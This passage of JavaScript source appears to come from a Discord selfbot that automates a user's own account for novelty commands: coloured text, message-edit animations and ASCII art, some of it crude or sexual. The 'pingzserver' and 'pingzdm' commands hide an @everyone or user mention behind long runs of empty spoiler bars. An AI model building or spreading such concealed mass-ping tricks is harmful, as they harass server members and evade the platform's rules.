                .addField("**```" + prefix + "reverse + TEXT ```**", `***${language.REVERSE_DESC}.***`)
                .addField("**```" + prefix + "autocyan ```**", `***${language.CYAN_DESC}.***`)
                .addField("**```" + prefix + "autored ```**", `***${language.RED_DESC}.***`)
                .addField("**```" + prefix + "autogreen ```**", `***${language.GREEN_DESC}.***`)
                .addField("**```" + prefix + "autoyellow ```**", `***${language.YELLOW_DESC}.***`)
                .addField("**```" + prefix + "autoorange ```**", `***${language.ORANGE_DESC}.***`)
                .addField("**```" + prefix + "autoblue ```**", `***${language.BLUE_DESC}.***`)
                .addField("**```" + prefix + "underline + TEXT ```**", `***${language.UNDERLINE_DESC}.***`)
                .addField("**```" + prefix + "bold + TEXT ```**", `***${language.BOLD_DESC}.***`)
                .addField("**```" + prefix + "bar + TEXT ```**", `***${language.BAR_DESC}.***`)
                .addField("**```" + prefix + "italic + TEXT ```**", `***${language.ITALIC_DESC}.***`)
                .addField("**```" + prefix + "return + TEXT ```**", `***${language.RETURN_DESC}.***`)
                .addField("**```" + prefix + "pingzserver + TEXT ```**", `***${language.PINGZGUILD_DESC}.***`)
                .addField("**```" + prefix + "pingzdm + MENTION + TEXT ```**", `***${language.PINGZGUILD_DESC}.***`)
                .addField("**```" + prefix + "... ```**", `***${language.POINT_DESC}.***`)
                .addField("**```" + prefix + "OwO ```**", `***${language.OWOTEXT_DESC}.***`)
                .addField("**```" + prefix + "abc ```**", `***${language.ABC_DESC}.***`)
                .addField("**```" + prefix + "ahegao ```**", `***${language.AHEGAO_DESC}.***`)
                .addField("**```" + prefix + "troll ```**", `***${language.TROLL_DESC}.***`)
                .addField("**```" + prefix + "facepalm ```**", `***${language.FACEPALM_DESC}.***`)
                .addField("**```" + prefix + "girlexcited ```**", `***${language.GIRLEXCITED_DESC}.***`)
                .addField("**```" + prefix + "girlsurprised ```**", `***${language.GIRLSURPRISED}.***`)
                .addField("**```" + prefix + "amogus ```**", `***${language.AMOGUS_DESC}.***`)
                .addField("**```" + prefix + "whentheimpostorissus ```**", `***${language.WHENTHEIMPOSTORISSUS_DESC}.***`)

            const textmenu1 = new Discord.RichEmbed()
                .setColor(color)
                .addField("**```" + prefix + "cursedcat ```**", `***${language.CURSEDCAT_DESC}.***`)
                .addField("**```" + prefix + "girlstare ```**", `***${language.GIRLSTARE_DESC}.***`)
                .addField("**```" + prefix + "bongocat ```**", `***${language.BONGOCAT_DESC}.***`)
                .addField("**```" + prefix + "middlefinger ```**", `***${language.MIDDLEFINGER_DESC}.***`)
                .addField("**```" + prefix + "aperocket ```**", `***${language.APEROCKET_DESC}.***`)
                .addField("**```" + prefix + "buffdoge ```**", `***${language.BUFFDOGE_DESC}.***`)
                .addField("**```" + prefix + "girlbruh ```**", `***${language.GIRLBRUH_DESC}.***`)
                .addField("**```" + prefix + "animeass ```**", `***${language.ANIMEASS_DESC}.***`)
                .addField("**```" + prefix + "dickart ```**", `***${language.DICKART_DESC}.***`)
                .addField("**```" + prefix + "satisfied ```**", `***${language.SATISFIED_DESC}.***`)
                .addField("**```" + prefix + "whentheimpostorissusv2 ```**", `***${language.WHENTHEIMPOSTORISSUSV2_DESC}.***`)
                .addField("**```" + prefix + "fortnitedance ```**", `***${language.FORTNITEDANCE}.***`)
                .addField("**```" + prefix + "autoyifive ```**", `***${language.YIFIVE_DESC}.***`)
                .addField("**```" + prefix + "autosmalltext ```**", `***${language.SMALLTEXT_DESC}.***`)
                .addField("**```" + prefix + "autoinfotext ```**", `***${language.INFOTEXT_DESC}.***`)
                .addField("**```" + prefix + "autoboldtext ```**", `***${language.AUTOBOLD_DESC}.***`)
                .addField("**```" + prefix + "autospoiler ```**", `***${language.AUTOSPOILER_DESC}.***`)
                .addField("**```" + prefix + "autopingz ```**", `***${language.AUTOPINGZ_DESC}.***`)
                .addField("**```" + prefix + "autoanimatedletter ```**", `***${language.AUTOANIMATEDLETTER_DESC}.***`)
                .addField("**```" + prefix + "autoowoifytext ```**", `***${language.AUTOOWOIFYTEXT_DESC}.***`)
                .addField("**```" + prefix + "betteremojis ```**", `***${language.BETTEREMOJIS_DESC}.***`)
                .addField("**```" + prefix + "amongusarmy ```**", `***${language.AMONGUSARMY_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)


            message.channel.send(textmenu)
            message.channel.send(textmenu1)
            consolelog("information", `${language.DEBUG_LOG_TEXT_SEND}.`)
        }

        if (cmd === "ascii")
        {
            message.delete()
            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            figlet(args.join(' '), (err, data) => 
            {
                message.channel.send(data, 
                    {
                    code: 'ascii'
                });
            });
        }

        if (cmd === "reverse")
        {
            message.delete()
            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            const text = args.join(' ')
            const converted = text.split('').reverse().join('');
            message.channel.send(`\u180E${converted}`);
        }

        if (cmd === "autocyan")
        {
            if (cyantext === "off") 
            {
                cyantext = "on";
                message.delete()
                DoNotif("```Cyan text colors mode enabled. ✅```")
            } 
            else
            {
                cyantext = "off";
                message.delete()
                return DoNotif("```Cyan text colors mode disabled. ❌```");
            }
        }

        if (cmd === "autored")
        {
            if (redtext === "off") 
            {
                redtext = "on";
                message.delete()
                DoNotif("```Red text colors mode enabled. ✅```")
            } 
            else
            {
                redtext = "off";
                message.delete()
                return DoNotif("```Red text colors mode disabled. ❌```");
            }
        }

        if (cmd === "autogreen")
        {
            if (greentext === "off") 
            {
                greentext = "on";
                message.delete()
                DoNotif("```Green text colors mode enabled. ✅```")
            } 
            else
            {
                greentext = "off";
                message.delete()
                return DoNotif("```Green text colors mode disabled. ❌```");
            }
        }

        if (cmd === "autoyellow")
        {
            if (yellowtext === "off") 
            {
                yellowtext = "on";
                message.delete()
                DoNotif("```Yellow text colors mode enabled. ✅```")
            } 
            else
            {
                yellowtext = "off";
                message.delete()
                return DoNotif("```Yellow text colors mode disabled. ❌```");
            }
        }

        if (cmd === "autoorange")
        {
            if (orangetext === "off") 
            {
                orangetext = "on";
                message.delete()
                DoNotif("```Orange text colors mode enabled. ✅```")
            } 
            else
            {
                orangetext = "off";
                message.delete()
                return DoNotif("```Orange text colors mode disabled. ❌```");
            }
        }

        if (cmd === "autoblue")
        {
            if (bluetext === "off") 
            {
                bluetext = "on";
                message.delete()
                DoNotif("```Blue text colors mode enabled. ✅```")
            } 
            else
            {
                bluetext = "off";
                message.delete()
                return DoNotif("```Blue text colors mode disabled. ❌```");
            }
        }

        if (cmd === "underline")
        {
            message.delete()
            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            var msg = args.join(' ');

            message.channel.send("__" + msg + "__")
        }

        if (cmd === "bold")
        {
            message.delete()
            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            var msg = args.join(' ');

            message.channel.send("**" + msg + "**")
        }

        if (cmd === "bar")
        {
            message.delete()
            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            var msg = args.join(' ');

            message.channel.send("~~" + msg + "~~")
        }

        if (cmd === "italic")
        {
            message.delete()
            var msg = args.join(' ');

            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            message.channel.send("_" + msg + "_")
        }

        if (cmd === "return")
        {
            const mapping = '¡"#$%⅋,)(*+\'-˙/0ƖᄅƐㄣϛ9ㄥ86:;<=>?@∀qƆpƎℲפHIſʞ˥WNOԀQɹS┴∩ΛMX⅄Z[/]^_`ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz{|}~'
            const OFFSET = '!'.charCodeAt(0);
            
            if (!args[0]) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            message.delete()
            message.channel.send(args.join(' ').split('').map(c => c.charCodeAt(0) - OFFSET).map(c => mapping[c] || ' ').reverse().join(''));
        }

        if (cmd === "pingzserver")
        {
            message.delete()
            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            var msg = args.join(' ');

            var server = message.guild;
            if (!server) return DoNotif(language.ERROR_COMMANDS_ONLY_SERVER_NOTIF)
            if (!msg) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)

            message.channel.send(`${msg} ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| @everyone`)
        }

        if (cmd === "pingzdm")
        {
            var user = message.mentions.users.first()
            var server = message.guild;
            let msg = args.slice(1).join(" ");

            message.delete()

            if (server) return DoNotif(language.ERROR_COMMANDS_ONLY_DM_NOTIF)
            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF)
            if (!msg) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)

            message.channel.send(msg + "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| @" + user.toString())
        }

        if (cmd === "...")
        {
            message.edit('.')
            message.edit('..')
            message.edit('...')
            message.edit('.')
            message.edit('..')
            message.edit('...')
            message.edit('.')
            message.edit('..')
            message.edit('...')
            message.edit('.')
            message.edit('..')
            message.edit('...')
            message.edit('.')
            message.edit('..')
            message.edit('...')
            message.edit('.')
            message.delete()
        }

        if (cmd === "OwO")
        {
            message.delete()
            async function work() 
            {
                let owo = (await neko.sfw.catText());
                message.channel.send(owo.cat).catch(error => 
                {
                    console.error(error);
                });
            }
            
            work();
        }

        if (cmd === "abc")
        {
            message.edit('a')
            message.edit('b')
            message.edit('c')
            message.edit('d')
            message.edit('e')
            message.edit('f')
            message.edit('g')
            message.edit('h')
            message.edit('i')
            message.edit('j')
            message.edit('k')
            message.edit('l')
            message.edit('m')
            message.edit('n')
            message.edit('o')
            message.edit('p')
            message.edit('q')
            message.edit('r')
            message.edit('s')
            message.edit('t')
            message.edit('u')
            message.edit('v')
            message.edit('w')
            message.edit('x')
            message.edit('y')
            message.edit('z')
            message.delete()
        }

        if (cmd === "ahegao")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
            ⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
            ⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
            ⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
            ⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
            ⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
            ⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
            ⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
            ⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
            ⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
            ⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
            ⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
            ⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
            ⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴`)
        }

        if (cmd === "troll")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
       ░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄
    ░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄
    ░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█
    ░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░█
    ░▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░█
    █▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒█
    █▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
    ░█▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
    ░░█░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
    ░░░█░░██░░▀█▄▄▄█▄▄█▄████░█
    ░░░░█░░░▀▀▄░█░░░█░███████░█
    ░░░░░▀▄░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
    ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░█
    ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░█
    ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░█
    `)
        }

        if (cmd === "facepalm")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▄░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███▀█░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░██░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░░██░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄██░░░░██░░
    ░░░░░░░░░░░░░░░░▄▄█▀▀▀▀█▄▄▄▄███▄░░░██░░
    ░░░░░░░░░░░░░▄█▀░░░░░░░░░▀▀▀▀█░▀█░░██░░
    ░░░░░░░░░░░░█▀░░░░░░░░░░░░░░░▀█▄█▀▀▀░░░
    ░░░░░░░░░░░▄▀░░░░░░░░░░░░░░░░▀█▄░░░░░░░
    ░░░░░░░░░░░▀█▄░█░░▄▀░░░░░░░▄▄█░░░░░░░░░
    ░░░░░░░░▄▄▄▄█▀▀▀██▄▄░░░░░░▄▀░░░░░░░░░░░
    ░░░░▄▄██▄▀▀░░░░░█▀░░░░░░▄██▄░░░░░░░░░░░
    ░░▄██▀▀░░░░░░░░▄█░░░░░▄█▀▄█░▀▀█▄▄▄▄▄▄▄▄
    ░██▀░░░░░░░░▄██░░░░░░▄▀▄▄▀░░░░░░░░░░░░░
    █▀▀░░░░░░▄█▀▄░▀▄▄▄▄██▀▀▀░░░░░█░░░░░░░░░
    █░░░░░▄▄▀░░░░█░░░░░░░░░░░░░░░▀░░░░░░░░░
    ░▀▀▀▀▀▀░░░░░░░█░░░░░░░░░░░░░░░▀▀█▀▀▀▀▀▀
    ░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░█▀░░░░░░
    ░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░▄█░░░░░░░
    `)
        }

        if (cmd === "girlexcited")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉⠉⠛⠻⢿⣿⠿⠛⠋⠁⠈⠙
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠴⣿⠟⠉⠀⠀⠈⡀⠀⠀⠀⠀⠀⠀
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⣾⣿⣿⣿⣿⣿⠿⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠉⢁⠀⠀⠈⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⣀⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⢀⣠⣾⣿⠀⠀⠐⢦⡀⠀
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠟⠛⠋⢷⣄⠀⠀⠹⣦
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠛⠛⠛⠛⠯⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⡀⠘
            ⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠉⠑⠢⣀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣷
            ⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⡇⠀⠀⠀⣀⠄⠒⠀⠀⠀⠀⠀⠑⠢⡙⡳⣄⠀⠀⠀⠈⠀⠀⠀⠀⠈⠻⣿
            ⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠃⢀⡴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⠈⠳⡄⠀⠀⠀⢂⠀⠀⠀⠀⠘
            ⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣾⡀⢐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣴⡀⠁⠀⠙⢦⠀⠀⠈⣧⡀⠀⠀⠀
            ⣿⣿⣿⠃⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠳⡈⡀⠀⠀⠀⠀⠀⢀⣤⣶⣿⡿⠿⠽⠿⠿⣿⣷⣶⣌⡳⡀⠀⢹⣷⡄⠀⠀
            ⣿⡟⠁⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠑⢥⠀⠀⡾⠋⣰⡿⡟⠊⠀⠚⣿⣿⣿⣶⣄⠀⠉⢹⠀⢳⠀⢸⣿⣿⡄⠀
            ⣿⠇⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠈⠀⠈⠀⠰⢻⠋⠀⣀⣀⣠⣿⣿⣿⣿⣿⣇⠀⠈⠀⠀⢃⢘⡏⢿⣿⡄
            ⡿⠀⠀⠀⠀⠀⠀⣿⠈⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀⠋⠀⠀⢿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠘⣼⡇⠈⢿⣿
            ⡇⠀⠀⠀⠀⡆⠀⣿⠀⠀⡨⠂⠄⡀⠀⠀⠀⠠⣀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠈⣿
            ⡇⠀⠀⠀⠀⠀⠀⢸⠀⣐⠊⠀⠀⠀⢉⠶⠶⢂⠈⠙⠒⠂⠠⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠸
            ⠀⣀⠂⢣⡀⠀⠀⠘⣠⠃⠀⠀⠀⠀⣠⣴⣾⠷⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⡀⡙⠀⠈⢧⠀⠡⡀⢉⠀⠀⠀⠀⣴⣿⡫⣋⣥⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⡗⠃⠐⠀⠈⣷⡀⢳⡄⠂⠀⠀⣸⣿⡛⠑⠛⢿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⡇⡀⠂⡀⠀⣸⢱⡈⠇⠐⠄⡠⣿⡟⠁⠀⠀⣸⣿⣿⣿⡟⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⣿⡐⡀⠀⢠⠏⠀⢳⡘⡄⠈⠀⢿⡿⠀⢻⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⣿⣧⠐⢀⡏⠀⠀⠀⢳⡴⡀⠀⢸⣿⡄⠀⠉⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣶⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⣿⣿⣆⠀⠐⡀⠀⠀⠀⢻⣷⡀⠀⠃⠙⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⣿⣿⣿⣆⠀⠙⣄⠀⠀⠀⠱⣕⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴
            ⣿⣿⣿⣿⣧⡀⠘⢦⡀⠀⠀⠈⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿
            ⣿⣿⣿⣿⣿⣷⢄⠈⠻⣆⠀⠀⠀⠑⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿`)
        }

        if (cmd === "girlsurprised")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⡿⠟⠛⠛⠛⠛⢻⣿⣟⣛⣉⣉⣉⣉⠉⠉⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⠟⠋⠀⠁⠐⠂⢀⠖⠁⠀⠀⠀⠀⠀⠀⠈⠉⠲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣤⣤⣄⣀⣠⠾⢯⣤⣦⣤⣤⣤⣀⡀⠀⠀⠀⢰⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⡟⠉⢾⣿⠟⢉⡉⠉⢹⣟⢿⣷⣦⢢⠘⣿⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⡟⠀⠀⠸⠁⢰⣿⣷⣶⣤⣿⣷⠙⢿⡃⠀⠛⠀⠀⢻⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⡿⠀⠀⠀⠀⠀⠚⠻⠿⣿⣟⣻⡿⠀⠈⠁⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⡿⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⡇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠟⣿⠇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣭⣕⡀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⣀⠉⠻⢿⣦⡀⠹⠙⣿⣿⣿⣿⣿⣿⣿
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⢀⣾⣷⣄⠀⣦⡻⣷⡀⠀⠸⣿⣿⣿⣿⣿⣿
            ⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣶⣦⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣧⢿⣧⠄⠀⣿⣿⣿⣿⣿⣿
